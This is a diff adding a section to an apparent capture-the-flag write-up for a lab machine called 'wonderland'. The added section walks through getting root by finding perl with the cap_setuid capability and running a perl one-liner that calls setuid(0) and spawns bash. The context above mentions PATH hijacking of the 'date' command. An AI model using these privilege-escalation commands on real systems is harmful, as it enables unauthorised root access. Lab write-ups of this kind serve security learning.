@@ -299,6 +299,42 @@ hatter
 ```
 The shell command executed by the script calls command "date" without specifying the full path "/bin/date". The exploit would be to create our own executable "date" and change the environment path with export. Once the script calls "date", it will run the one we created. It would be basically creating a shell for us. And just like that we got ourselves a shell with user hatter
 
+#### Root we get
+Since we got access to every normal account on the machine, there was nothing left for us but to get root, which will secure for us the flags. After going through the usual privilege escalation checklist I found something interesting in capabilities
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+perl has the setuid capability! Which means that we could be able to create a shell and setuid to 0 which will give us a shell with root priveleges!
+```
+hatter@wonderland:~$ ls -al /usr/bin/perl
+-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
+```
+And users in group "hatter" are able to run perl! We are actually done here, lets get a perl script that does just that and run it
+```perl
+hatter@wonderland:~$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+After running the command, we get permission denied error. Weird. We run "id"
+```
+hatter@wonderland:/home/hatter$ id
+uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
+```
+The previous script which spawned a shell for us as hatter had set our groupid to "1002" which means we cant run just yet perl.
+After checking hatter's home directory, we find a file "password.txt". Using this file we are able to relog in properly as hatter with
+```bash 
+hatter@wonderland:/home/hatter$ su hatter
+Password: 
+hatter@wonderland:~$ id
+uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
+```
+We now finish by running our perl script and becoming root!
+```
+hatter@wonderland:~$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+root@wonderland:~# whoami
+root
+```
 ---
 ### Post Exploitation
 ---
